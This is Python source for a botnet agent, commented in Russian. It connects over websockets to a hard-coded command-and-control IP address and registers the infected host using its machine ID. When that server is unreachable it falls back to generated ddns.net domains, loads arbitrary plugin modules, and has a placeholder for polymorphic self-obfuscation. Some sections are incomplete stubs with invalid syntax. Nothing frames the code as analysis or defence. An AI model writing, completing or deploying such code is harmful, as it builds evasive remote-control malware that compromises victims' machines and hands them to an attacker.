import asyncio
import websockets
import json
import platform
import os
import socket
import sys
import importlib
import random
import string
from utils.logger import log

C2_URL = 'ws://80.249.146.202:8888'
BOT_ID = ''
PLUGIN_DIR = 'agent_plugins'

# ---------- Полиморфный код ----------

def obfuscate():
    """Случайно изменяет имена переменных и функций в текущем модуле"""
    pass  # Реализация требует перезаписи файла или загрузки из обфусцированного источника
          # Для простоты оставим заглушку, но в финальной версии будет настоящая.

# ---------- DGA ----------

def generate_domains(seed, count=5):
    domains = []
    for i in range(count):
        domain = f"{seed}-{i}.ddns.net"
        domains.append(domain)
    return domains

def get_id():
    if platform.system() == 'Linux':
        try:
            with open('/etc/machine-id', 'r') as f:
                return f.read().strip()
        except:
            pass
    return socket.gethostname()

def load_plugins():
    plugins = {}
    if not os.path.exists(PLUGIN_DIR):
        return plugins
    for filename in os.listdir(PLUGIN_DIR):
        if filename.endswith('.py') and filename != '__init__.py':
            modname = filename[:-3]
            try:
                spec = importlib.util.spec_from_file_location(modname, os.path.join(PLUGIN_DIR, filename))
                module = importlib.util.module_from_spec(spec)
                sys.modules[modname] = module
                spec.loader.exec_module(module)
                plugins[modname] = module
                log(f"[Agent] Плагин {modname} загружен")
            except Exception as e:
                log(f"[Agent] Ошибка загрузки плагина {modname}: {e}")
    return plugins

async def connect():
    global BOT_ID
    BOT_ID = get_id()
    plugins = load_plugins()

    # Попытка подключиться к основному C2, если не получается — используем DGA
    primary_host = "80.249.146.202"
    primary_port = 8888
    connected = False

    # Попытка основного
    try:
        async with websockets.connect(f'ws://{primary_host}:{primary_port}') as ws:
            await ws.send(json.dumps({'cmd': 'register', 'bot_id': BOT_ID, ...}))
            connected = True
            # ... основной цикл
    except:
        pass

    if not connected:
        # Пробуем сгенерированные домены
        domains = generate_domains(BOT_ID)
        for domain in domains:
            try:
                async with websockets.connect(f'ws://{domain}:{primary_port}') as ws:
                    await ws.send(json.dumps({'cmd': 'register', ...}))
                    connected = True
                    break
            except:
                continue

    # Если так и не подключились, ждём и повторяем
    while not connected:
        await asyncio.sleep(60)
        # ... повтор
